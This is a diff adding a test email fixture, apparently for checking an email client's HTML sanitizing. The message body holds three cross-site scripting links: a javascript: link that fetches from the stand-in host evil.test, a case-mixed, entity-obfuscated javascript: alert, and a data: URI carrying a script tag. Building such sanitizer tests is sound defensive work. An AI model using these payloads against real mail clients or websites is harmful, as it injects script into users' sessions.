@@ -1,0 +1,9 @@
+From: Bob Sender <bob@golub.test>
+To: Alice <alice@golub.test>
+Date: Mon, 02 Nov 2026 10:00:00 +0100
+Message-ID: <xss-javascript-link@golub.test>
+Subject: XSS javascript link
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><body><a href="javascript:fetch('https://evil.test/js')">click</a> <a href="JaVaScRiPt&#58;alert(1)">obfuscated</a> <a href="data:text/html,<script>alert(1)</script>">data</a></body></html>
